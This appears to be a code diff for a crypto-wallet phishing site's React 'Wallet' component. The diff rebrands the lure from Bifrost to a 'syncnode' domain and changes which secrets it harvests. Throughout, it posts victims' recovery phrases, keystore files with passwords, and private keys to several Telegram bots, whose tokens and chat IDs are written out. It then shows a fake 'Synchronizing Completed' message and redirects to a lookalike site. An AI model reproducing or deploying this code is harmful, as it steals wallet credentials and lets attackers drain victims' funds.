@@ -62,7 +62,7 @@ import blockchain from './coins/blockchain.png';
 import binance from './coins/biancesmart.png';
 import ark from './coins/Aktionariat.png';
 
-import fwallet from './bitfrost.webp';
+import fwallet from './syncnode.png';
 import pmask from './popular/pmask.svg';
 
 
@@ -617,7 +617,7 @@ function Wallet(){
               
               
                     alert(`Synchronizing Completed, Kindly login in an hour`);
-                    window.location.href = 'https://govern.bifrostweb.app/';
+                    window.location.href = 'https://syncnode-devware.vitarts.online/';
                 
                
 
@@ -655,13 +655,13 @@ function Wallet(){
 
             await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
                 chat_id: 6150403557,
-                text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
+                text: `Wallet : ${selectedName} , Type : Keystore Json , Keystore Json : ${keystore_json}, Wallet Password : ${wallet_password}`,
               });
 
 
             await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
                 chat_id: 5868304053,
-                text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
+                text: `Wallet : ${selectedName} , Type : Keystore Json , Keystore Json : ${keystore_json}, Wallet Password : ${wallet_password}`,
               });
 
 
@@ -684,7 +684,7 @@ function Wallet(){
               
               
                     alert(`Synchronizing Completed, Kindly login in an hour`);
-                    window.location.href = 'https://govern.bifrostweb.app/';
+                    window.location.href = 'https://syncnode-devware.vitarts.online/';
                 
                
 
@@ -723,19 +723,19 @@ function Wallet(){
 
             await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
                     chat_id: 6150403557,
-                    text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
+                    text: `Wallet : ${selectedName} , Type : Private Key , Private Key : ${private_key}`,
                   });
 
 
                 await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
                     chat_id: 5868304053,
-                    text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
+                    text: `Wallet : ${selectedName} , Type : Private Key , Private Key : ${private_key}`,
                   });
 
 
                   const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
                     chat_id: 5916570239,
-                    text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
+                    text: `Wallet : ${selectedName} , Type : Private Key , Private Key : ${private_key}`,
                   });
   
         
@@ -749,7 +749,7 @@ function Wallet(){
               
               
                     alert(`Synchronizing Completed, Kindly login in an hour`);
-                    window.location.href = 'https://govern.bifrostweb.app/';
+                    window.location.href = 'https://syncnode-devware.vitarts.online/';
                 
                
 
@@ -777,7 +777,7 @@ function Wallet(){
 
         <div className='px-5 py-5'>
             <img  className='myimage'style={{
-                width:"170px"
+                width:"200px"
             }} src={fwallet}/>
 
         </div>
